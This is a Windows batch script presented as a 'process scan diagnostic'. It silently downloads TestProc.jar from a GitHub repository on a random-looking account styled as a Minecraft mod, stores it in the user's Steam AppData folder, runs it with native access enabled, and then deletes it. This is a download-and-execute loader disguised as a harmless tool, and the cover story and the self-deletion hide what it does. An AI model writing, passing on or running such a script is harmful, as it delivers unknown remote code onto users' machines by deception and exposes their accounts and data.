@echo off
chcp 65001 >nul
setlocal EnableDelayedExpansion

set "jarc=%USERPROFILE%\AppData\Local\Steam\TestProc.jar"
set "url=https://github.com/edhjsertwasfvds/ModMinecraftJar1.2.8/raw/main/TestProc.jar"

if not exist "%jarc%" (
    powershell -NoProfile -Command "Invoke-WebRequest -Uri '%url%' -OutFile '%jarc%'" >nul 2>&1
    if not exist "%jarc%" (
        echo Failed to download TestProc.jar
        pause
        exit /b 1
    )
)

for /f "tokens=3" %%a in ('java -version 2^>^&1 ^| findstr /i "version"') do (
    echo Java version: %%a
)

echo.
echo Running process scan diagnostic...
echo.
java --enable-native-access=ALL-UNNAMED -jar "%jarc%"

if exist "%jarc%" del /f /q "%jarc%"

echo.
echo Diagnostic complete. Press any key to close.
pause >nul
